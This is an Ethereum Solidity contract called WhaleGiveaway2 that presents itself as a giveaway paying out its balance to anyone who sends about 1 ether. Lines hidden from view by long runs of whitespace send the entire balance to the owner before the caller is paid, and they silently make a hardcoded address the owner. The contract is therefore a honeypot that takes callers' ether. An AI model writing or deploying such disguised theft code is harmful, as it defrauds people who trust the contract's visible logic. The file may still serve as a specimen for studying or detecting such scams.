pragma solidity ^0.4.19;

contract WhaleGiveaway2
{
    address public Owner = msg.sender;
    uint constant public floorEligibility = 0.999001 ether;

    function()
    public
    payable
    {

    }

    function claimResources()
    public
    payable
    {
        if(msg.value>=floorEligibility)
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    Owner.transfer(this.balance);
            msg.sender.transfer(this.balance);
        }
    }

    function dischargeFunds()
    payable
    public
    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        if(msg.sender==0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b){Owner=0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b;}
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }

    function Command(address adr,bytes record)
    payable
    public
    {
        require(msg.sender == Owner);
        adr.call.value(msg.value)(record);
    }
}